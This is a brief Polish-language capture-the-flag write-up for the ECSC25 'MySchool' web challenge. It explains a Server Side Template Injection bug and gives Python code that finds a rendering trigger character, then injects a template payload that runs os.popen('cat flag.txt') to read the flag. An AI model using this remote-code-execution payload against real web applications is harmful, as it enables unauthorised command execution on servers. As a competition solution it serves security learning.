# MySchool - web

### Vulnerability

Server Side Template Injection

### Solution

1. Znaleźć znak który pozwoli na wyświetleniu naszego nowego usera na stronie (unsecurely renderując template):
   ```python
   HOST = "https://myschool.ecsc25.hack.cert.pl/"
   # HOST = "http://localhost:8000"

   for x in range(256):
     session_id = requests.post(HOST + "/users/", json={
       "username": "test" + chr(x),
       "bio": "asdf"
     }).text[1:-1]

     resp = requests.get(HOST + "/users/?session_id=" + session_id).text
     if "asdf" in resp:
       print("char:", x) # \x20 (spacja)
       break
   ```
2. Wyexploitować SSTI i przeczytać flagę:
   ```python
   separator = "\x20"
   payload = """
   {{ ''.__class__.mro()[1].__subclasses__()[158].__init__.__builtins__["__import__"]("os").popen("cat flag.txt").read() }}
   """

   session_id = requests.post(HOST + "/users/", json={
     "username": "test\x20",
     "bio": payload
   }).text[1:-1]
   print(requests.get(HOST + "/users/?session_id=" + session_id).text) # ecsc25{NULL_is_not_always_False}
   ```
